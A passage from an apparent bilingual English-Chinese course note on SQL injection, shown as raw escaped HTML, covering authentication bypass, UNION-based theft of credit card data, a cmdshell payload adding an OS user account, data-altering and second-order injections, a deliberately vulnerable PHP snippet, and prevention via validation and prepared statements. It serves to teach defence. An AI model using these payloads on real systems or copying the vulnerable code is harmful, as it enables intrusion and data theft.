&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;To authenticate logins, server runs this SQL command against the user database&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; USERS &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;$username&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;AND&lt;/span&gt; password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;$password&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;User enters the following as  &lt;code&gt;$username&lt;/code&gt;  and  &lt;code&gt;$password&lt;/code&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; OR password LIKE &amp;#x27;&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;%&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Server then executes&lt;/p&gt;
 &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; USERS &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;OR&lt;/span&gt; password &lt;span class=&#34;keyword&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;%&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;AND&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;OR&lt;/span&gt; password &lt;span class=&#34;keyword&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;%&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;username=&#39;&#39; OR password LIKE &#39;%&#39;&lt;/code&gt;  的条件总是为真，因为  &lt;code&gt;password LIKE &#39;%&#39; &lt;/code&gt; 可以匹配任何密码。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Steal Data&lt;br&gt;
 攻击者使用一种常见的技巧，通过构造特殊的输入，使查询条件总是返回 true，以便获取更多的数据。&lt;br&gt;
When the result is returned to the user&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; email &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; USERS &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;$username&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;AND&lt;/span&gt; password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;$password&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;To get more data, attacker gives  &lt;code&gt;username&lt;/code&gt;&lt;/p&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; OR 1=1 #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;1=1&lt;/code&gt;  是一个始终为真的条件。&lt;br&gt;
 &lt;code&gt;#&lt;/code&gt;  (在 MySQL 中) 或  &lt;code&gt;--&lt;/code&gt;  (在其他 RDBMS 中) 表示注释符号，后面的所有内容都被忽略。这样一来， &lt;code&gt;AND password=&#39;$password&#39; &lt;/code&gt; 就被注释掉了，不会影响查询的结果。&lt;br&gt;
因此最终结果是：&lt;/p&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; email &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; USERS &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于  &lt;code&gt;WHERE&lt;/code&gt;  子句总为真，查询会返回  &lt;code&gt;USERS&lt;/code&gt;  表中所有用户的电子邮件地址，而不仅仅是匹配特定用户名和密码的记录。&lt;/p&gt;
&lt;p&gt;也可以从其他数据库窃取数据 通过输入 &lt;code&gt;username&lt;/code&gt;&lt;/p&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; AND 1=0 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; UNION SELECT cardholder, number, exp_month, exp_year FROM &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; creditcards #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于第一部分的条件不成立，原查询不返回任何结果；但  &lt;code&gt;UNION&lt;/code&gt;  操作符使得查询的结果变成信用卡表中的数据，从而被攻击者获取。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Run Shell Commands&lt;br&gt;
 通过在数据库服务器上 执行 shell 命令，来创建一个新的用户账户。通过这种方式，攻击者能够突破数据库的边界，直接对操作系统进行修改，从而使服务器更加容易受到进一步的攻击。&lt;br&gt;
用户输入：攻击者在用户名字段中输入以下字符串：&lt;/li&gt;
&lt;/ol&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;; exec cmdshell &amp;#x27;&lt;/span&gt;net &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; badguy badpwd&lt;span class=&#34;string&#34;&gt;&amp;#x27; /ADD #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;&#39;;&lt;/code&gt; ：结束了当前的 SQL 查询语句。&lt;br&gt;
 &lt;code&gt;exec cmdshell &#39;net user badguy badpwd&#39; /ADD&#39;&lt;/code&gt; ：利用数据库服务器的  &lt;code&gt;cmdshell&lt;/code&gt;  功能来执行系统命令。在这个例子中，它会创建一个名为  &lt;code&gt;badguy&lt;/code&gt; ，密码为  &lt;code&gt;badpwd&lt;/code&gt;  的新用户账户。&lt;br&gt;
 &lt;code&gt;#&lt;/code&gt; ：注释符号，用来忽略后续的 SQL 语句。&lt;/p&gt;
&lt;p&gt;注入后的 SQL 查询变成了：&lt;/p&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; UserTable &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user badguy badpwd&amp;#x27;&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;ADD&lt;/span&gt; #...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Change、Destory Data&lt;br&gt;
Create new users&lt;/li&gt;
&lt;/ol&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;; INSERT INTO USERS (&amp;#x27;&lt;/span&gt;uname&lt;span class=&#34;string&#34;&gt;&amp;#x27;,&amp;#x27;&lt;/span&gt;passwd&lt;span class=&#34;string&#34;&gt;&amp;#x27;) &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; VALUES (&amp;#x27;&lt;/span&gt;hacker&lt;span class=&#34;string&#34;&gt;&amp;#x27;,&amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;38&lt;/span&gt;a74f&lt;span class=&#34;string&#34;&gt;&amp;#x27;); # &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Reset email (or password, etc.)&lt;/p&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;; UPDATE USERS SET email=&amp;#x27;&lt;/span&gt;hacker&lt;span class=&#34;variable&#34;&gt;@root&lt;/span&gt;.org&lt;span class=&#34;string&#34;&gt;&amp;#x27;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; WHERE email=&amp;#x27;&lt;/span&gt;victim&lt;span class=&#34;variable&#34;&gt;@yahoo&lt;/span&gt;.com&lt;span class=&#34;string&#34;&gt;&amp;#x27;; #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Second-Order SQL Injections&lt;/li&gt;
&lt;/ol&gt;
  &lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_connect&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;root&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_select_db&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Shipping&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$HTTP_GET_VARS&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;id&amp;quot;&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$qry&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT ccnum FROM cust WHERE id = &lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt;&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$qry&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_result&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ccnum&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;No result!&amp;quot;&lt;/span&gt; . &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;初始注入：攻击者设法将  &lt;code&gt;uname&lt;/code&gt;  字段设置为： &lt;code&gt;admin&#39; #&lt;/code&gt; 。&lt;br&gt;
在另一个活动中，例如密码更新操作，代码可能会使用之前存储的  &lt;code&gt;uname&lt;/code&gt;  值。因为  &lt;code&gt;uname&lt;/code&gt;  包含注释符号，实际执行的 SQL 语句将变成：&lt;/p&gt;
  &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;UPDATE&lt;/span&gt; USERS &lt;span class=&#34;keyword&#34;&gt;SET&lt;/span&gt; passwd&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;cracked&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Persistent storage (such as a table row) is deemed as a &lt;strong&gt;trusted source&lt;/strong&gt; thus may not be sanitised&lt;br&gt;
Attacks may be subsequently executed by &lt;strong&gt;multiple&lt;/strong&gt; activities&lt;/p&gt;
&lt;h1 id=&#34;Preventing SQL Injection&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Preventing SQL Injection&#34;&gt;#&lt;/a&gt;Preventing SQL Injection&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Finding SQL Injection Vulnerabilities&lt;br&gt;
Any application that has the following pattern is at risk of SQL injection
&lt;ol&gt;
&lt;li&gt;Take user input&lt;/li&gt;
&lt;li&gt;Do not check validity of user input&lt;/li&gt;
&lt;li&gt;Use user input data to query a database&lt;/li&gt;
&lt;li&gt;Use string manipulation to build the SQL query or the SQL exec command&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Manual Techniques&lt;br&gt;
Try entering junk SQL commands into input fields you suspect may not be validated
&lt;ul&gt;
&lt;li&gt;Use as username:  &lt;code&gt;abc&#39; JFKDJ #&lt;/code&gt; &lt;br&gt;
Look for errors or unexpected behaviour&lt;/li&gt;
&lt;li&gt;Some web applications running in debug mode will show you the whole SQL statement to “help you debug”, but this also helps attackers attack&lt;/li&gt;
&lt;li&gt;常见的手动测试字符串：&lt;br&gt;
 &lt;code&gt;&#39; OR 1=1 --&lt;/code&gt; ：绕过身份验证。&lt;br&gt;
 &lt;code&gt;&#39; UNION SELECT NULL, NULL, NULL --&lt;/code&gt; ：尝试访问其他表中的数据。&lt;br&gt;
 &lt;code&gt;&#39; AND (SELECT COUNT(*) FROM users) &amp;gt; 0 --&lt;/code&gt; ：检测查询逻辑。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Automated Techniques
&lt;ol&gt;
&lt;li&gt;Sqlmap (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5vcmc=&#34;&gt;sqlmap.org&lt;/span&gt;) profiles the database on a given URL&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Identify vulnerable parameters&lt;/li&gt;
&lt;li&gt;Identify which types of attacks work&lt;/li&gt;
&lt;li&gt;Take over the database&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL Inject Me was a Firefox add-on&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Try standard SQL injection techniques for a variety of database languages&lt;/li&gt;
&lt;li&gt;In every form on a page&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Preventing SQL Injection
&lt;ol&gt;
&lt;li&gt;Input validation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Filter any character with special meanings (apostrophes, semicolons, percent symbols, hyphens, etc.)&lt;/li&gt;
&lt;li&gt;Check the data type (e.g. make sure it’s an integer)&lt;/li&gt;
&lt;li&gt;Blacklisting “bad” characters doesn’t always work
&lt;ol&gt;
&lt;li&gt;Could prevent valid input (e.g. last name O’Brien)&lt;/li&gt;
&lt;li&gt;Forget to filter out some characters&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Escaping quotes&lt;br&gt;
Use escape characters to prevent the quote from becoming part of the query. Example: convert  &lt;code&gt;&#39; &lt;/code&gt;  into  &lt;code&gt; \&#39;&lt;/code&gt; . Different databases have different rules for escaping&lt;/li&gt;
&lt;li&gt;Whitelisting&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Allow only well-defined set of safe values&lt;/li&gt;
&lt;li&gt;Set implicitly defined through regular expressions 正则表达式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Best Solution: Prepared Statements( Separating code and data)&lt;br&gt;
In most injection attacks, data is interpreted as control: this changes the semantics of a query or a command&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Typed bind variables:  &lt;code&gt;? &lt;/code&gt; placeholders guaranteed to be data (not control)&lt;/li&gt;
&lt;li&gt;Prepared statements are &lt;strong&gt;pre-compiled&lt;/strong&gt; by the database management system waiting for input&lt;/li&gt;
&lt;li&gt;Placeholders prevent that the users input gets attached to the SQL query resulting in a separation of code and data&lt;/li&gt;
&lt;li&gt;For example, the database registers  &lt;code&gt;&#39;Robert&#39; ); DROP TABLE Students;--&#39;&lt;/code&gt;&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Prepared Statement: Java&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;PreparedStatement&lt;/span&gt; &lt;span 